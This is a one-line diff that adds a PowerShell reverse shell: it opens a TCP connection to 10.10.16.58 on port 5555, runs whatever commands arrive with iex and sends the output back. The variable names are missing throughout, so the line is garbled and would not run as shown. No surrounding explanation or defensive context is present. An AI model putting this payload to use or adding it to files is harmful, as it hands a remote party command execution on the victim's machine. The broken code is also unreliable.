@@ -1,0 +1,1 @@
+ = New-Object System.Net.Sockets.TCPClient(10.10.16.58,5555); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + PS  + (pwd).Path + 
